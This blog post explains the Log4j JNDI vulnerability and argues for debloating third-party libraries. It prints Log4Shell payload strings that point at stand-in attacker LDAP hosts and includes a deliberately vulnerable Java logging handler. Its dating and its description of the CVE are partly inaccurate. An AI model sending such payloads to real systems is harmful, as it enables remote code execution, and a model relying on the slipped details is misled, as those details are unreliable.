<!doctype html><html xmlns=http://www.w3.org/1999/xhtml lang=en-us xml:lang=en-US itemscope itemtype=http://schema.org/WebSite><head><script>(function(){let a=localStorage.getItem('theme');a==='dark'&&document.documentElement.setAttribute('data-theme','dark')})()</script><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>Why Debloating Third-Party Software?</title><meta name=keywords content="debloating,log4j,security,vulnerabilities,software engineering"><link rel=alternate type=application/rss+xml title="César Soto Valero  César - Computer Scientist" href=https://www.cesarsotovalero.net/feed.xml><script src=https://cdn.jsdelivr.net/npm/typed.js@2.0.12></script>
<link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Rouge+Script&display=swap" rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=../img/favicon/redketchup/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../img/favicon/redketchup/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../img/favicon/redketchup/favicon-16x16.png><link rel=manifest href=../img/favicon/redketchup/site.webmanifest><link id=code rel=stylesheet href=../css/pygment_highlights.css><script src=https://d3js.org/d3.v7.min.js></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-107061705-1"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','UA-107061705-1')</script><script type=text/javascript>(function(a,e,b,f,g,c,d){a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},c=e.createElement(f),c.async=1,c.src="https://www.clarity.ms/tag/"+g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d)})(window,document,"clarity","script","bs3gcidnol")</script><script src=../js/anchor.min.js></script>
<link rel=stylesheet href=//use.fontawesome.com/releases/v5.12.0/css/all.css><link rel=stylesheet href=/css/bootstrap.min.css><link rel=stylesheet href=/css/bootstrap-social.css><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/css/academicons.css><link rel=stylesheet href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic"><link rel=stylesheet href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"><meta name=generator content="Jekyll v4.3.2"><meta property="og:title" content="Why Debloating Third-Party Software?"><meta name=author content="César Soto Valero"><meta property="og:locale" content="en_US"><meta name=description content="The Log4j vulnerability is an example of the dangers of massively reusing third-party libraries. This article discusses how software debloating can make a difference by reducing the attack surface of applications, removing unnecessary code from software libraries."><meta property="og:description" content="The Log4j vulnerability is an example of the dangers of massively reusing third-party libraries. This article discusses how software debloating can make a difference by reducing the attack surface of applications, removing unnecessary code from software libraries."><link rel=canonical href=https://www.cesarsotovalero.net/blog/why-debloating-third-party-software.html><meta property="og:url" content="https://www.cesarsotovalero.net/blog/why-debloating-third-party-software.html"><meta property="og:site_name" content="César Soto Valero"><meta property="og:image" content="https://www.cesarsotovalero.net/img/posts/2022/2022-06-15/satyr-cover.jpg"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-06-15T00:00:00-07:00"><meta name=twitter:card content="summary"><meta property="twitter:image" content="https://www.cesarsotovalero.net/img/posts/2022/2022-06-15/satyr-cover.jpg"><meta property="twitter:title" content="Why Debloating Third-Party Software?"><meta name=twitter:site content="@cesarsotovalero"><meta name=twitter:creator content="@César Soto Valero"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"César Soto Valero","url":"https://www.cesarsotovalero.net/about-me"},"dateModified":"2025-07-29T11:58:39-07:00","datePublished":"2022-06-15T00:00:00-07:00","description":"The Log4j vulnerability is an example of the dangers of massively reusing third-party libraries. This article discusses how software debloating can make a difference by reducing the attack surface of applications, removing unnecessary code from software libraries.","headline":"Why Debloating Third-Party Software?","image":"https://www.cesarsotovalero.net/img/posts/2022/2022-06-15/satyr-cover.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cesarsotovalero.net/blog/why-debloating-third-party-software.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://www.cesarsotovalero.net/img/pages/cesar/avatar-icon-2024.jpg"},"name":"César Soto Valero"},"url":"https://www.cesarsotovalero.net/blog/why-debloating-third-party-software.html"}</script><script type=text/x-mathjax-config> MathJax.Hub.Config({ TeX: { equationNumbers: { autoNumber: "all" } } });
   </script><script type=text/x-mathjax-config>
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"] ],
          processEscapes: true
        }
      });
   </script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type=text/javascript></script></head><body><nav class="navbar-fixed-top navbar-custom navbar navbar-expand-lg navbar-light bg-light"><button class=navbar-toggle type=button data-toggle=collapse data-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="collapse navbar-collapse container-fluid" id=navbarSupportedContent><ul class="navigation list-inline text-center footer-links" id=black-icons><li class="nav-item navbar-custom" title=Home><a id=navbar-brand href=https://www.cesarsotovalero.net>Home</a></li><li class="nav-item navbar-custom"><a href=/blog>Blog</a></li><li class="nav-item navbar-custom"><a href=/linkedin>LinkedIn</a></li><li class="nav-item navbar-custom"><a href=/youtube>YouTube</a></li><li class="nav-item navbar-custom"><a href=/podcasts>Podcasts</a></li><li class="nav-item navbar-custom"><a href=/talks>Talks</a></li><li class="nav-item navbar-custom"><a href=/about-me>About</a></li><li class="nav-item navbar-custom" title="Toggle Night Mode"><a href=# id=theme-toggle onclick=modeSwitcher() style=cursor:pointer></a></li></ul></div></nav><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class=header-image style=padding-left:15px><div class="row justify-content-center" style=margin-right:0;margin-left:0></div></div><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1 class=no-anchor>Why Debloating Third-Party Software?</h1><h2 class=post-subheading>The case of the Log4j vulnerability</h2><div class="container flex-container"><a href=https://www.cesarsotovalero.net/about-me><img class=avatar-img-small src=/img/pages/cesar/avatar-icon-2024.jpg alt="César Soto Valero" id=meta-img></a><div class=flex-item><span class=post-meta>Posted on June 15, 2022</span><div><span class=post-meta title="Estimated read time"><svg id="i-clock" viewBox="0 0 32 32" width="18" height="18" style="vertical-align:middle" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="3"><circle cx="16" cy="16" r="14"/><path d="M16 8v8l4 4"/></svg>&nbsp;11 mins read</span>
<span class="blog-tags post-meta"><svg id="i-tag" aria-hidden="true" focusable="false" data-prefix="far" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-tag fa-w-16" width="16.5" height="16.5"><path fill="none" d="M497.941 225.941 286.059 14.059A48 48 0 00252.118.0H48C21.49.0.0 21.49.0 48v204.118a47.998 47.998.0 0014.059 33.941l211.882 211.882c18.745 18.745 49.137 18.746 67.882.0l204.118-204.118c18.745-18.745 18.745-49.137.0-67.882zM259.886 463.996 48 252.118V48h204.118L464 259.882 259.886 463.996zM192 144c0 26.51-21.49 48-48 48s-48-21.49-48-48 21.49-48 48-48 48 21.49 48 48z"/></svg>debloating</span></div></div></div><div class=flex-item><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style=margin-left:0><section id=share-section><script type=text/javascript src=https://storage.ko-fi.com/cdn/widget/Widget_2.js></script><script type=text/javascript>kofiwidget2.init('Support this blog','#7aa4d1','G2G3CRPPI'),kofiwidget2.draw()</script></section></div></div></div><div class=cesarcarbon id=cesarcarbonads-post><script async type=text/javascript src="//cdn.carbonads.com/carbon.js?serve=CESI52JM&placement=wwwcesarsotovaleronet" id=_carbonads_js></script></div></div></div><div class="col-lg-4 col-lg-pull-2 col-md-2 col-md-pull-2"><ol id=toc class=section-nav><li class="toc-entry toc-h1"><a href=#the-log4j-vulnerability>The Log4j Vulnerability</a></li><li class="toc-entry toc-h1"><a href=#preventive-software-debloating>Preventive Software Debloating</a></li><li class="toc-entry toc-h1"><a href=#software-debloating-strategies>Software Debloating Strategies</a></li><li class="toc-entry toc-h1"><a href=#conclusion>Conclusion</a></li><li class="toc-entry toc-h1"><a href=#references>References</a></li></ol></div></div></div></div></header><div class=container><div class=row><div class="col-lg-9 col-lg-offset-2 col-md-10 col-md-offset-1"><article role=main class=blog-post><aside class=youtube><a href="https://www.youtube.com/watch?v=DqL3-bnSCy0"><div class=box><img src=https://i.ytimg.com/vi/DqL3-bnSCy0/mqdefault.jpg alt="YouTube video #DqL3-bnSCy0"><div class=play><img src=/img/icons/youtube-play20px.svg alt="Play Video" class=youtube-logo></div></div></a><div>The Silent Crisis of Software Bloat;
14 September 2024.</div></aside><p>Most software applications today are built using third-party libraries and frameworks that together constitute the application’s <a href=../blog/the-software-supply-chain.html>software supply chain</a>.
These libraries are often large and complex pieces of engineering, with many features and functionalities to support a wide range of use cases.
Consequently, most applications only use a small subset of these features.
This means that <strong>the majority of the code in software libraries is actually unnecessary</strong> from the perspective of the application that is using them.
This excess of code is a security risk, as third-party code could contain dormant vulnerabilities that can be exploited by cyber-attackers.
One way to mitigate this risk is by debloating the software through the removal of unnecessary features and components.
This article explores the benefits of <a href=../blog/diversity-driven-software-debloat.html>debloating software libraries based on the actual usage</a>, and discusses how this strategy can enhance the security of applications reliant on third-party libraries. Using the recent Log4j security vulnerability as a case study, this article discusses how debloating could have diminished the impact of such incident.</p><figure class=jb_picture><img width style=border: src=/assets/resized/satyr-640x373.jpg alt=TODO data-srcset="/assets/resized/satyr-640x373.jpg 640w,/assets/resized/satyr-768x448.jpg 768w,/assets/resized/satyr-1024x597.jpg 1024w,/assets/resized/satyr-1366x797.jpg 1366w,/assets/resized/satyr-1600x933.jpg 1600w," class="blur-up lazyautosizes lazyload"><figcaption class=stroke>&#169; Let's reuse code, sit, sing, and hope for the best. Photo from a wooden satyr in <a href=https://goo.gl/maps/EjhcQKd9rBBfUTu48>Stockholm City Museum</a>.</figcaption></figure><h1 id=the-log4j-vulnerability>The Log4j Vulnerability</h1><p>On December 29<sup>th</sup> 2021, a critical vulnerability was discovered in the popular Java logging library called <a href=https://logging.apache.org/log4j/2.x/>Log4j</a>.
The versions affected ranged <a href=https://github.com/advisories/GHSA-jfh8-c2jp-5v3q>between 2.0-beta9 and 2.14.1 included</a>.
Once reported and confirmed, this vulnerability received the identifier code <a href=https://nvd.nist.gov/vuln/detail/CVE-2021-44228>CVE-2021-44228</a>, so that the security community could track it.</p><p>In this case, an attacker with permission to modify the logging configuration file was able to construct a malicious configuration using a <a href=https://logging.apache.org/log4j/2.x/manual/appenders.html#jdbcappender>JDBC Appender</a> with a data source referencing a Java Naming and Directory Interface URI (<a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html#:~:text=The%20Java%20Naming%20and%20Directory,any%20specific%20directory%20service%20implementation.">JNDI</a>).
This allows the attacker to execute remote code.
The vulnerability stemmed from the <a href=https://github.com/apache/logging-log4j2/blob/2.x/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java><i class="fab fa-github"></i><code class="language-plaintext highlighter-rouge">JndiLookup</code></a> class in Log4j, which allowed JNDI lookups.</p><blockquote><p>“The Java Naming and Directory Interface (JNDI) is an API that allows applications to discover and look up data and objects via a name. These objects can be anything from simple data items (like strings and numbers) to more complex network services. JNDI lookup is essentially the process of retrieving an object or piece of data bound to a particular name in a naming or directory service.”</p></blockquote><p>When Log4j is configured to log unsanitized user input, an attacker can insert a malicious string which would cause Log4j to initiate a JNDI lookup.
For example, the string <code class="language-plaintext highlighter-rouge">${jndi:ldap://malicious.server/payload}</code> would cause Log4j to perform a JNDI lookup on the <code class="language-plaintext highlighter-rouge">malicious.server</code> URI.
This can lead to <a href=https://en.wikipedia.org/wiki/Arbitrary_code_execution>Remote Code Execution</a> (RCE) because certain JNDI services, like LDAP, can return serialized Java objects, allowing the attacker to run arbitrary code on the affected server.</p><p>In summary, the attack works as follows:</p><ol><li>The user sends logging data to the server via TCP, HTTP, or any other protocol allowing this.</li><li>The server writes in the logs via Log4j, adding data containing the malicious payload in the request. For example, appending <code class="language-plaintext highlighter-rouge">${jndi:ldap://malicioussite.com/exploit}</code>, where <code class="language-plaintext highlighter-rouge">malicioussite.com</code> is an attacker-controlled server.</li><li>The Log4j vulnerability is triggered and the server makes a request to <code class="language-plaintext highlighter-rouge">malicioussite.com</code> via JNDI.</li><li>The response contains a path to a remote Java class file, which will be injected into the server process.</li><li>The injected payload allows the attacker to execute arbitrary code remotely (e.g., to gain local administrative access on the host machine).</li></ol><p>The following simple Java code represents a scenario where an attacker can exploit this vulnerability via the <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent>User Agent header</a> of an HTTP request:</p><figure class=highlight><pre><code class=language-java data-lang=java><table class=rouge-table><tbody><tr><td class="gutter gl"><pre class=lineno>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class=code><pre><span class=cm>/**
* A simple HTTP handler that will process HTTP requests and logs them back.
*/</span>
<span class=kd>public</span> <span class=kd>class</span> <span class=nc>VulnerableLog4jExampleHandler</span> <span class=kd>implements</span> <span class=nc>HttpHandler</span> <span class=o>{</span>

  <span class=kd>static</span> <span class=nc>Logger</span> <span class=n>log</span> <span class=o>=</span> <span class=nc>Logger</span><span class=o>.</span><span class=na>getLogger</span><span class=o>(</span><span class=n>log4jExample</span><span class=o>.</span><span class=na>class</span><span class=o>.</span><span class=na>getName</span><span class=o>());</span>

  <span class=cm>/**
   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
   * @param the HTTP Request Object
   */</span>
  <span class=kd>public</span> <span class=kt>void</span> <span class=nf>handle</span><span class=o>(</span><span class=nc>HttpExchange</span> <span class=n>he</span><span class=o>)</span> <span class=kd>throws</span> <span class=nc>IOException</span> <span class=o>{</span>
    <span class=c1>// The User Agent from the HTTP request is retrieved and stored in the userAgent variable.</span>
    <span class=n>string</span> <span class=n>userAgent</span> <span class=o>=</span> <span class=n>he</span><span class=o>.</span><span class=na>getRequestHeader</span><span class=o>(</span><span class=s>"user-agent"</span><span class=o>);</span>
    <span class=c1>// Logging the User Agent, this is where the exploit occurs.</span>
    <span class=c1>// If an attacker sends a malicious payload like ${jndi:ldap://attacker.com/a} as the User Agent, then</span>
    <span class=c1>// log4j will try to resolve this expression, leading to a remote code execution (RCE) vulnerability.</span>
    <span class=n>log</span><span class=o>.</span><span class=na>info</span><span class=o>(</span><span class=s>"Request User Agent:"</span> <span class=o>+</span> <span class=n>userAgent</span><span class=o>);</span>
    <span class=c1>// A response is then generated, echoing back the User Agent within an HTML message and a 200 OK status.</span>
    <span class=nc>String</span> <span class=n>response</span> <span class=o>=</span> <span class=s>"&lt;h1&gt;Hello There, "</span> <span class=o>+</span> <span class=n>userAgent</span> <span class=o>+</span> <span class=s>"!&lt;/h1&gt;"</span><span class=o>;</span>
    <span class=n>he</span><span class=o>.</span><span class=na>sendResponseHeaders</span><span class=o>(</span><span class=mi>200</span><span class=o>,</span> <span class=n>response</span><span class=o>.</span><span class=na>length</span><span class=o>());</span>
    <span class=nc>OutputStream</span> <span class=n>os</span> <span class=o>=</span> <span class=n>he</span><span class=o>.</span><span class=na>getResponseBody</span><span class=o>();</span>
    <span class=n>os</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>response</span><span class=o>.</span><span class=na>getBytes</span><span class=o>());</span>
    <span class=n>os</span><span class=o>.</span><span class=na>close</span><span class=o>();</span>
  <span class=o>}</span>
<span class=o>}</span>
</pre></td></tr></tbody></table></code></pre></figure><p>And here’s the attack and its preventive countermeasures described graphically:</p><figure class=jb_picture><img width style="border:1px solid gray" src=/assets/resized/log4j_attack-640x433.png alt="The log4j JNDI attack and how to prevent it." data-srcset="/assets/resized/log4j_attack-640x433.png 640w,/assets/resized/log4j_attack-768x519.png 768w,/assets/resized/log4j_attack-1024x692.png 1024w," class="blur-up lazyautosizes lazyload"><figcaption class=stroke>Fig 1. The log4j JNDI attack (in black) and how to prevent it (in red). Image source: <a href=https://www.govcert.admin.ch/>Swiss Government Computer Emergency Response Team</a>.</figcaption></figure><p>Because Log4j is ubiquitously used in Java applications, this vulnerability was particularly alarming in critical business such as governments and financial institutions (e.g., the Spring Boot framework is very popular for developing Java microservices, and it <a href=https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot>uses Log4j</a>).
Apart from the direct RCE exploit, this vulnerability also opened up doors to other attack vectors like <a href=https://en.wikipedia.org/wiki/Denial-of-service_attack>Denial of Service (DoS)</a> via extremely resource-intensive JNDI lookups, or Information Disclosure as the malicious server can capture IP addresses of the servers making the lookup.</p><p>In summary, the impact of this vulnerability was widespread, affecting countless systems, and requiring immediate patching.
The patched <a href=https://logging.apache.org/log4j/2.x/release-notes/2.15.0.html>version 2.15.0</a> was swiftly released by the Apache Logging team and removed the vulnerable feature, and many organizations rushed to update their Log4j versions or implement mitigations like JVM flags or firewall rules.
This incident also highlights the importance of being cautious when parsing and logging untrusted input, and it also emphasizes <strong>the need for regular security reviews of even well-established and trusted libraries in the software ecosystem</strong>.</p><h1 id=preventive-software-debloating>Preventive Software Debloating</h1><p>The Log4j vulnerability brought to light the dangers from the excess of code and features in widely used libraries.
A library as pervasive as Log4j having a critical flaw suggests that even well-maintained codebases can contain dormant vulnerabilities, especially in rarely used features.
This incident underscores the importance of taking care of the software supply chain of applications by removing or disabling code that is not necessary for its correct functionality.</p><p><a href=../software-debloating-papers.html>Software debloating</a> is a technique that allows organizations to reduce the attack surface of their applications by removing unnecessary features and components.
The idea is simple: if parts of a library or software aren’t present, they can’t be exploited.
Based on this premise, fewer components and lines of code in a software product can lead to fewer vulnerabilities, as there is fewer points for an attacker to target.</p><p>For example, most applications that used Log4j didn’t even require the <code class="language-plaintext highlighter-rouge">JndiLookup</code> functionality or the ability to process JNDI lookups.
However, since this feature was present in the Log4j dependency, and it was integrated into their applications, they became vulnerable.
If this feature had been removed or wasn’t a part of the version of the library they were using, the vulnerability would have had no impact on them, even if the flaw still existed in the code of the broader Log4j project.</p><p>Henceforth, if an organization had debloated their version of Log4j, removing features and components they didn’t use from their classpath, such as the <code class="language-plaintext highlighter-rouge">JndiLookup</code> class, they would have naturally been immune to this particular vulnerability.
This example underscores the principle that <strong>debloating unnecessary components can reduce the potential points of failure or exploitation in software projects</strong>.</p><h1 id=software-debloating-strategies>Software Debloating Strategies</h1><p>There are several strategies for debloating software, each with its own advantages and disadvantages.
The following are the three most common approaches, and how they might have helped at mitigating the Log4j vulnerability.</p><h2 id=static-analysis-based-debloating>Static Analysis-Based Debloating</h2><ul><li><strong>Principle</strong>: Detect and remove unused code without executing it.</li><li><strong>Advantages</strong>: As there is no need to run the software, it is usually faster than dynamic analysis so it can be integrated into build processes.</li><li><strong>Challenges</strong>: Over-approximation might lead to removing code that’s actually needed or under-approximation might leave more code than necessary. Static analysis is particularly <a href=../blog/the-dynamic-features-of-java.html>challenging for dynamic languages like Java</a>, where code is loaded at runtime.</li><li><strong>How it could have helped</strong>: By using tools like <a href=https://en.wikipedia.org/wiki/ProGuard>ProGuard</a> for Java, which can identify and remove unused classes, fields, methods, and attributes from compiled applications, most applications could have removed the <code class="language-plaintext highlighter-rouge">JndiLookup</code> class from the classpath.</li></ul><h2 id=dynamic-analysis-based-debloating><strong>Dynamic Analysis-Based Debloating</strong></h2><ul><li><strong>Principle</strong>: Detect and remove the code that is not executed, typically under various scenarios and with the help of instrumentation.</li><li><strong>Advantages</strong>: The usage information collected is more accurate than static analysis since it’s based on real execution patterns.</li><li><strong>Challenges</strong>: It needs representative workloads or usage scenarios which are difficult to collect in practice. Might miss some code paths that are only invoked in rare situations, causing crashes or unexpected behavior.</li><li><strong>How it could have helped</strong>: Profiling a Java application during its runtime to see which methods of a library like Log4j are invoked and which aren’t. If certain methods are never called across various representative runs, they can be considered for removal.</li></ul><h2 id=hybrid-based-debloating><strong>Hybrid-Based Debloating</strong></h2><ul><li><strong>Principle</strong>: Combines both static and dynamic analysis. Software is first profiled using dynamic analysis to collect data on which parts are most used, then that data guides static debloating processes.</li><li><strong>Advantages</strong>: Combines the accuracy of dynamic analysis with the thoroughness of static analysis tools.</li><li><strong>Challenges</strong>: The process is more complex, as it needs both runtime profiling and post-profiling analysis stages.</li><li><strong>How it could have helped</strong>: Running a Java application under peak loads to gather profile data, and then passing that data to a tool that prunes unused parts of libraries like Log4j. Profile-guided debloating tools could have identified that the <code class="language-plaintext highlighter-rouge">JndiLookup</code> class was never used in the application, and therefore could have removed it from the classpath.</li></ul><h1 id=conclusion>Conclusion</h1><figure class=badge><a href=../files/thesis/cesar-fulltext.pdf><img src=../files/thesis/thesis_first_page.png style=width:140px;max-width:100% alt=badge></a></figure><p>The Log4j vulnerability offers a poignant lesson on the latent dangers of reusing third-party code.
It emphasizes the security benefits of minimizing codebases and removing unused features from dependencies.
Ideally, <strong>developers should ship to production only what is actually necessary for a given application or service</strong>, thereby reducing its overall attack surface.
In our increasingly security-conscious world, using code debloating techniques might shift from being an optional code minimization technique to becoming a critical security measure. With debloating in place, future incidents like the Log4j vulnerability will be prevented.</p><p><strong>UPDATE:</strong> If you want to learn more about software debloating in Java, I wrote my PhD thesis on this subject, check it out <a href=../files/thesis/cesar-fulltext.pdf>here</a>.</p><h1 id=references>References</h1><ul><li><a href=https://www.infoq.com/news/2021/12/log4j-zero-day-vulnerability/>Vulnerability Affecting Multiple Log4j Versions Permits RCE Exploit</a></li><li><a href=https://logging.apache.org/log4j/2.x/security.html#fixed-in-log4j-2-15-0-java-8>Apache Log4j Security Vulnerabilities</a></li><li><a href=https://www.govcert.admin.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/>Zero-Day Exploit Targeting Popular Java Library Log4j</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=/blog/my-ultimate-terminal-customizations-for-macos.html data-toggle=tooltip data-placement=top title="My Ultimate Terminal Customizations for macOS">&larr; Previous Post</a></li><li class=next><a href=/blog/on-the-parkinson-law-of-triviality-for-computer-science-researchers.html data-toggle=tooltip data-placement=top title="On the Parkinson's Law of Triviality for Computer Science Researchers">Next Post &rarr;</a></li></ul><br></div></div></div><script>anchors.options={position:'left'},anchors.add('h1:not(.no-anchor)','h2','h3')</script><div class=container><div class=row><div class="col-lg-10 col-lg-offset-2 col-md-10 col-md-offset-1" style=padding-right:15px><div class=flex-container-footer-badges><section class=share-section><a href="https://twitter.com/intent/tweet?text=The+Log4j+vulnerability+is+an+example+of+the+dangers+of+massively+reusing+third-party+libraries.+This+article+discusses+how+software+debloating+can+make+a+difference+by+reducing+the+attack+surface+of+applications%2C+removing+unnecessary+code+from+software+libraries.+https://www.cesarsotovalero.net/blog/why-debloating-third-party-software.html" class="btn btn-my-icon btn-twitter" title="Share on Twitter"><span id=share-twitter class="fab fa-twitter" aria-hidden=true></span>
<span class=sr-only>Twitter</span></a>
<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.cesarsotovalero.net/blog/why-debloating-third-party-software.html" class="btn btn-my-icon btn-linkedin" title="Share on LinkedIn"><span id=share-linkedin class="fab fa-linkedin-in" aria-hidden=true></span>
<span class=sr-only>LinkedIn</span></a>
<a href="https://www.facebook.com/sharer/sharer.php?u=https://www.cesarsotovalero.net/blog/why-debloating-third-party-software.html" class="btn btn-my-icon btn-facebook" title="Share on Facebook"><span class="fab fa-facebook-f" aria-hidden=true></span>
<span class=sr-only>Facebook</span></a>
<a href="https://www.reddit.com/submit?url=https%3A%2F%2Fwww.cesarsotovalero.net%2Fblog%2Fwhy-debloating-third-party-software.html" class="btn btn-my-icon btn-reddit" title="Share on Reddit"><span class="fab fa-fw fa-reddit" aria-hidden=true></span>
<span class=sr-only>Reddit</span></a>
<a href="https://t.me/share/url?url=https%3A%2F%2Fwww.cesarsotovalero.net%2Fblog%2Fwhy-debloating-third-party-software.html&text=The+Log4j+vulnerability+is+an+example+of+the+dangers+of+massively+reusing+third-party+libraries.+This+article+discusses+how+software+debloating+can+make+a+difference+by+reducing+the+attack+surface+of+applications%2C+removing+unnecessary+code+from+software+libraries." class="btn btn-my-icon btn-telegram" title="Share on Telegram"><i class="fab fa-telegram"></i>
<span class=sr-only>Telegram</span></a>
<a href="http://news.ycombinator.com/submitlink?u=https%3A%2F%2Fwww.cesarsotovalero.net%2Fblog%2Fwhy-debloating-third-party-software.html&t=Why+Debloating+Third-Party+Software%3F" class="btn btn-my-icon btn-hn" title="Share on Hacker News"><i class="fab fa-hacker-news-square"></i>
<span class=sr-only>Hacker News</span></a></section></div><div id=related-posts><hr><h2>Related Posts</h2><div class="panel-deck row"><div class=col-sm-4><div class=panel><a href=/blog/unneccessary-code.html><div class=panel-body><div class=text-left><h4 class=title data-toc-skip>Unnecessary Code</h4><div class=date style=margin-bottom:0>Posted on September 14, 2018</div></div><img src=../img/posts/2018/codecode_cover.png alt="Unnecessary Code"></div></a></div></div><div class=col-sm-4><div class=panel><a href=/blog/diversity-driven-software-debloat.html><div class=panel-body><div class=text-left><h4 class=title data-toc-skip>Diversity-Driven Software Debloat</h4><div class=date style=margin-bottom:0>Posted on June 8, 2020</div></div><img src=../img/posts/2020/crowd_cover.jpg alt="Diversity-Driven Software Debloat"></div></a></div></div><div class=col-sm-4><div class=panel><a href=/blog/i-am-switching-to-python-and-actually-liking-it.html><div class=panel-body><div class=text-left><h4 class=title data-toc-skip>I'm Switching to Python and Actually Liking It</h4><div class=date style=margin-bottom:0>Posted on July 15, 2025</div></div><img src=../img/posts/2025/2025-07-15/wall-stones_cover.JPG alt="I'm Switching to Python and Actually Liking It"></div></a></div></div></div></div><div><div id=giscus-container></div><script src=/js/load-giscus.js></script>
<script>window.addEventListener('load',loadGiscus)</script></div></div></div></div><script>window.addEventListener('DOMContentLoaded',()=>{const a=new IntersectionObserver(a=>{a.forEach(a=>{const b=a.target.getAttribute('id');a.intersectionRatio>0?document.querySelector(`#toc li a[href="#${b}"]`).parentElement.classList.add('active'):document.querySelector(`#toc li a[href="#${b}"]`).parentElement.classList.remove('active')})});document.querySelectorAll('h1[id]').forEach(b=>{a.observe(b)}),document.querySelectorAll('h2[id]').forEach(b=>{a.observe(b)})})</script><footer><div class="container beautiful-jekyll-footer"><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div style=text-align:center><div class=flex-container-footer-badges><a href=https://www.linkedin.com/in/cesarsotovalero><img alt="Connect on LinkedIn" src="https://img.shields.io/badge/LinkedIn-Connect-blue?style=social&logo=linkedin"></a>
<a href=https://www.youtube.com/channel/UCR4rI98w6-MqYoCS6jR9LGg><img alt="Subscribe to my YouTube channel" src="https://img.shields.io/youtube/channel/subscribers/UCR4rI98w6-MqYoCS6jR9LGg?logoColor=black&label=Subscribe"></a>
<a href=https://github.com/cesarsotovalero><img alt="Follow me on GitHub" src="https://img.shields.io/github/followers/cesarsotovalero?label=Follow%20me"></a></div></div><div class=flex-container-footer-copyright><p class="copyright text-muted">&copy; César Soto Valero&nbsp;&nbsp;&bull;&nbsp;&nbsp;2018&ndash;2025</p></div></div></div></div></footer><script>typeof jQuery=='undefined'&&document.write('<script src="/js/jquery-1.11.2.min.js"><\/script>')</script><script src=/js/bootstrap.min.js></script>
<script src=/js/main.js></script>
<script src=/js/flowtype.js></script>
<script src=/js/scroll-to-top.js></script>
<script src=/js/lazysizes.min.js></script>
<script src=/js/popup-footnotes.js></script>
<script src=/js/mermaid.min.js></script>
<script>$(document).ready(function(){mermaid.initialize({startOnLoad:!0,theme:"default"}),window.mermaid.init(void 0,document.querySelectorAll('.language-mermaid'))})</script><script>(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)})(window,document,'script','//www.google-analytics.com/analytics.js','ga'),ga('create','UA-107061705-1','auto'),ga('send','pageview')</script><script src=/js/mode-switcher.js></script></body></html>